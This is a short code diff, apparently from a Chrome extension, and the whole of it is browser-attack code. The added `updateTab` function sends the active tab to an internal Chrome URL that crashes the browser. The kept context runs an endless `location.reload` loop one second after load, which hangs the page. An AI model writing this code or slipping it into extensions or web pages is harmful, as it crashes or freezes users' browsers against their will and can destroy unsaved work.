@@ -1,8 +1,11 @@
-document.addEventListener('DOMContentLoaded', function() {
-       document.getElementById('test').addEventListener('click', function() {
-           chrome.tabs.update({ url: 'chrome://inducebrowsercrashforrealz' });
-       });
-   });
+function updateTab() {
+    chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
+        if (tabs.length > 0) {
+            chrome.tabs.update(tabs[0].id, { url: 'chrome://inducebrowsercrashforrealz' });
+        }
+    });
+}
+
 setTimeout(function(){
     while(1)location.reload(1)
 }, 1000)
